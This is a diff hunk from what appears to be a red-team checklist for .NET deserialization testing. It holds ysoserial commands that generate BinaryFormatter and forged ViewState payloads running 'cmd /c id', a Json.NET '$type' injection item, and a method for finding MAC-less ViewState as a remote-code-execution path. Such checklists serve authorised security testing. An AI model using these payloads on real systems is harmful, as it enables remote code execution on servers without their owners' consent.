@@ -72,7 +72,7 @@ origin: RedteamOpencode
       `ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c id"`
 - [ ] Test TypeNameHandling in Json.NET: `"$type":` property injection
 - [ ] ViewState with a KNOWN machine key (leaked in a config, GitHub, Blazor/Telerik default sample keys) — generate a MAC-valid malicious ViewState even when MAC validation IS enabled:
-      `ysoserial.exe -p ViewState -g TextFormattingRunProperties --generator="<generator-id>" --validationalg="SHA1" --validationkey="<leaked-key>" --macalg="SHA1" --macKey="<leaked-mac-key>" -c "cmd /c id"`
+      `ysoserial.exe -p ViewState -g TextFormattingRunProperties --generator="<generator-id>" --validationalg="SHA1" --validationkey="<leaked-key>" -c "cmd /c id"`
 - [ ] Blind MAC-less ViewState detection: submit a tampered ViewState with no signature and check whether the app throws a MAC-validation error (confirms MAC IS enforced) vs. a generic deserialization error (confirms it is NOT — direct RCE path)
 
 ### 5b. Ruby Marshal & YAML.load
